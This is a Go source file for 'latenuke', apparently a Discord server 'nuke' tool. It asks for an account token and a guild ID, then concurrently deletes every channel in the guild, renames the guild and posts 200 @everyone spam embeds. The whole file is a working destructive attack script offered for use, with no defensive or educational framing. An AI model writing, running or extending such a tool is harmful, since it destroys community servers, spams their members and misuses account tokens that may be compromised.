package main

import (
	"latenuke/funcs"
	"fmt"
	"sync"
	"bufio"
	"os"
)

func main() {
	var token string
	var name string
	var guildID string
	var text string

	scanner := bufio.NewReader(os.Stdin)

	fmt.Println(cyan)
	fmt.Println(`
                                                         
▄▄▄                        ▄▄▄    ▄▄▄                    
███             ██         ████▄  ███       ▄▄           
███       ▀▀█▄ ▀██▀▀ ▄█▀█▄ ███▀██▄███ ██ ██ ██ ▄█▀ ▄█▀█▄ 
███      ▄█▀██  ██   ██▄█▀ ███  ▀████ ██ ██ ████   ██▄█▀ 
████████ ▀█▄██  ██   ▀█▄▄▄ ███    ███ ▀██▀█ ██ ▀█▄ ▀█▄▄▄ 
                                                         
			github.com/latepatches
`)

	fmt.Print(cyan + "?" + reset + " Token " + cyan)
	fmt.Scanln(&token)
	fmt.Print(cyan + "?" + reset + " Guild ID " + cyan)
	fmt.Scanln(&guildID)
	fmt.Print(cyan + "?" + reset + " New Guild Name " + cyan)
	fmt.Scanln(&name)
	fmt.Print(cyan + "?" + reset + " Embed Text " + cyan)
	text, _ = scanner.ReadString('\n')

	var embed = fmt.Sprintf(`
{
  "content": "@everyone",
  "embeds": [
    {
      "title": "latenuke, made with <3",
      "description": "%s",
      "url": "https://github.com/latepatches/latenuke",
      "color": 4616959,
      "footer": {
        "text": "https://github.com/latepatches"
      }
    }
  ],
  "attachments": []
}
`, text)
	channels, err := funcs.GetChannelIDs(guildID, token)
	if err != nil {
	return
	}

	var wg sync.WaitGroup

	for _, cid := range channels {
	wg.Add(1)
	go funcs.DeleteChannel(cid, &wg, token)
	}

	wg.Add(1)
	go funcs.ChangeGuildName(guildID, name, &wg, token)

	for i := 0; i < 200; i++ {
	wg.Add(1)
	go funcs.PostMessage(guildID, "latenuke", embed, &wg, token)
	}

	wg.Wait()
}
